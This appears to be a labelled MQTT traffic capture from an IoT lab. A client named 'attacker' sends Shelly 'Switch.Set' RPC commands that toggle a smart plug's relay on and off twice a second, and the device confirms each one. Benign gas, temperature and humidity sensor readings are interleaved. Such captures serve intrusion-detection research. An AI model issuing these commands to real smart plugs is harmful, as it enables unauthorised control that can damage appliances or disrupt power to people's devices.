2026-04-22T16:38:47,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:38:47,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5242 34460.042 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:38:47,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":231.7, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:38:47,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34460.04,""swi"
2026-04-22T16:38:47,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 5243 34460.060 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:38:47,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:38:47,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:38:47,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5244 34460.542 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:38:47,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":231.7, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:38:47,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34460.54,""swi"
2026-04-22T16:38:47,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 5245 34460.558 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:38:48,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:38:48,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:38:48,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5246 34461.042 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:38:48,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":231.6, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:38:48,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34461.04,""swi"
2026-04-22T16:38:48,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 5247 34461.062 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:38:48,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:38:48,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:38:48,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5248 34461.544 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:38:48,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":231.6, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:38:48,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34461.54,""swi"
2026-04-22T16:38:48,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 5249 34461.561 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:38:49,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:38:49,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:38:49,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5250 34462.044 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:38:49,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":231.6, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:38:49,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34462.04,""swi"
2026-04-22T16:38:49,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 5251 34462.063 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:38:49,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:38:49,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:38:49,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5252 34462.545 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:38:49,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":231.6, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:38:49,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34462.54,""swi"
2026-04-22T16:38:49,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 5253 34462.561 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:38:50,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:38:50,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:38:50,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5254 34463.045 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:38:50,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":231.7, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:38:50,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34463.04,""swi"
2026-04-22T16:38:50,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 5255 34463.064 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:38:50,iot/mq/debug,50,[0;36m[D][sensor:124]: 'Gas Sensor' >> 0.56 V[0m
2026-04-22T16:38:50,iot/mq/sensor/gas_sensor/state,4,0.56
2026-04-22T16:38:50,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:38:50,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:38:50,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5256 34463.546 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:38:50,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":231.7, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:38:50,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34463.54,""swi"
2026-04-22T16:38:50,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 5257 34463.562 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:38:51,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:38:51,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:38:51,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5258 34464.048 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:38:51,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":231.7, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:38:51,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34464.05,""swi"
2026-04-22T16:38:51,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 5259 34464.067 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:38:51,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:38:51,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:38:51,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5260 34464.547 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:38:51,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":231.7, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:38:51,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34464.54,""swi"
2026-04-22T16:38:51,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 5261 34464.564 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:38:52,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:38:52,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:38:52,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5262 34465.047 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:38:52,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":231.7, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:38:52,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34465.04,""swi"
2026-04-22T16:38:52,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 5263 34465.066 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:38:52,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:38:52,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:38:52,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5264 34465.548 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:38:52,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":231.7, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:38:52,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34465.55,""swi"
2026-04-22T16:38:52,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 5265 34465.565 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:38:53,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:38:53,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:38:53,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5266 34466.050 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:38:53,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":231.5, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:38:53,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34466.05,""swi"
2026-04-22T16:38:53,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 5267 34466.069 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:38:53,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:38:53,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:38:53,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5268 34466.550 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:38:53,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":231.5, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:38:53,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34466.55,""swi"
2026-04-22T16:38:53,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 5269 34466.566 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:38:54,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:38:54,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:38:54,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5270 34467.050 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:38:54,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":231.5, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:38:54,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34467.05,""swi"
2026-04-22T16:38:54,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 5271 34467.069 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:38:54,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:38:54,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:38:54,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5272 34467.550 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:38:54,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":231.5, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:38:54,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34467.55,""swi"
2026-04-22T16:38:54,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 5273 34467.567 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:38:55,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:38:55,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:38:55,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5274 34468.051 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:38:55,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":231.5, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:38:55,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34468.05,""swi"
2026-04-22T16:38:55,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 5275 34468.070 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:38:55,iot/mq/debug,50,[0;36m[D][sensor:124]: 'Gas Sensor' >> 0.56 V[0m
2026-04-22T16:38:55,iot/mq/sensor/gas_sensor/state,4,0.56
2026-04-22T16:38:55,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:38:55,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:38:55,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5276 34468.554 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:38:55,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":231.5, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:38:55,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34468.55,""swi"
2026-04-22T16:38:55,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 5277 34468.571 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:38:56,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:38:56,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:38:56,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5278 34469.052 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:38:56,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":231.4, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:38:56,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34469.05,""swi"
2026-04-22T16:38:56,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 5279 34469.071 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:38:56,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:38:56,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:38:56,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5280 34469.553 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:38:56,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":231.4, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:38:56,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34469.55,""swi"
2026-04-22T16:38:56,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 5281 34469.571 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:38:56,iot/dht11/debug,59,[0;36m[D][dht:048]: Temperature 24.9°C Humidity 39.0%[0m
2026-04-22T16:38:56,iot/dht11/debug,53,[0;36m[D][sensor:124]: 'Temperature' >> 24.9 °C[0m
2026-04-22T16:38:56,iot/dht11/sensor/temperature/state,4,24.9
2026-04-22T16:38:56,iot/dht11/debug,46,[0;36m[D][sensor:124]: 'Humidity' >> 39 %[0m
2026-04-22T16:38:56,iot/dht11/sensor/humidity/state,2,39
2026-04-22T16:38:57,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:38:57,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:38:57,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5282 34470.053 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:38:57,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":231.4, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:38:57,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34470.05,""swi"
2026-04-22T16:38:57,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 5283 34470.072 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:38:57,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:38:57,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:38:57,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5284 34470.554 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:38:57,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":231.4, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:38:57,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34470.55,""swi"
2026-04-22T16:38:57,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 5285 34470.570 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:38:58,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:38:58,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:38:58,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5286 34471.055 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:38:58,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":231.5, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:38:58,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34471.05,""swi"
2026-04-22T16:38:58,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 5287 34471.073 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:38:58,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:38:58,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:38:58,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5288 34471.555 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:38:58,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":231.5, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:38:58,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34471.55,""swi"
2026-04-22T16:38:58,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 5289 34471.571 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:38:59,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:38:59,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:38:59,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5290 34472.056 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:38:59,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":231.6, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:38:59,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34472.05,""swi"
2026-04-22T16:38:59,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 5291 34472.075 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:38:59,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:38:59,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:38:59,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5292 34472.557 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:38:59,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":231.6, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:38:59,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34472.55,""swi"
2026-04-22T16:38:59,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 5293 34472.573 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:39:00,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:39:00,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
